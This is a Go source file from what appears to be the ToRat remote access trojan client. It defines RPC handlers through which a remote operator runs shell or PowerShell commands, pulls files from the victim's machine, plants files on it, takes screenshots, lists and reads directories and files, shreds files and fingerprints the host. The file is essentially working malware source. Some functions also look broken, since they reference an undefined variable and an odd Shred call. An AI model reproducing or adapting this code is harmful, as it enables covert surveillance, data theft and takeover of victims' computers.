package client

import (
	"bytes"
	"errors"
	"image/png"
	"io/ioutil"
	"os"
	"path/filepath"
	"reflect"

	"github.com/lu4p/ToRat/shared"
	"github.com/lu4p/ToRat/torat_client/crypto"
	"github.com/lu4p/cat"
	"github.com/showwin/speedtest-go/speedtest"
	"github.com/vova616/screenshot"
)

// API functions have this type
type API int

// Make sure API is never garbled.
var _ = reflect.TypeOf(API(0))

// Shred overwrites a path with zeros then deletes all contents
func (a *API) Shred(s *shared.Shred, r *shared.Void) error {
	return s.Conf.Path(s.Path)
}

// Hostname returns a unique reproducible client id
func (a *API) Hostname(v shared.Void, r *shared.EncAsym) error {
	hostname := crypto.GetHostname(HostnamePath, s.pubKey)
	*r = hostname
	return nil
}

func (a *API) RunCmd(cmd shared.Cmd, r *string) error {
	if cmd.Cmd == "" {
		return errors.New("no command to execute")
	}

	out, err := shared.RunCmd(cmd.Cmd, cmd.Powershell)
	if err != nil {
		return err
	}

	*r = string(out)
	return nil
}

func (a *API) SendFile(path string, r *shared.File) error {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	r.Path = path
	r.Fpath = abs
	r.Content = content
	return nil
}

func (a *API) RecvFile(f shared.File, r *shared.Void) error {
	return ioutil.WriteFile(f.Path, f.Content, f.Perm)
}

func (a *API) LS(v shared.Void, r *shared.Dir) (err error) {
	r.Files, err = filepath.Glob("*")
	if err != nil {
		return
	}
	r.Path, err = os.Getwd()
	return
}

func (a *API) Speedtest(v shared.Void, r *shared.Speedtest) error {
	user, err := speedtest.FetchUserInfo()
	if err != nil {
		return err
	}

	serverList, err := speedtest.FetchServerList(user)
	if err != nil {
		return err
	}

	targets, err := serverList.FindServer(nil)
	if err != nil {
		return err
	}

	for _, s := range targets {
		s.PingTest()
		s.DownloadTest(false)
		s.UploadTest(false)

		r.IP = user.IP
		r.Download = s.DLSpeed
		r.Upload = s.ULSpeed
		r.Ping = s.Latency.String()
		r.Country = s.Country
	}

	return nil
}

func (a *API) Screen(v shared.Void, r *[]byte) error {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		return err
	}

	buf := new(bytes.Buffer)
	if err := png.Encode(buf, img); err != nil {
		return err
	}

	*r = buf.Bytes()

	return nil
}

func (a *API) Reconnect(v shared.Void, r *bool) error {
	// TODO implement
	return nil
}

func (a *API) Cat(path string, r *string) error {
	txt, err := cat.File(path)
	if err != nil {
		return err
	}
	*r = txt
	return nil
}

func (a *API) Cd(path string, r *shared.Dir) (err error) {
	err = os.Chdir(path)
	if err != nil {
		return err
	}
	cwd, err := os.Getwd()
	if err != nil {
		return err
	}
	r.Path = cwd
	r.Files, err = filepath.Glob("*")
	return err
}
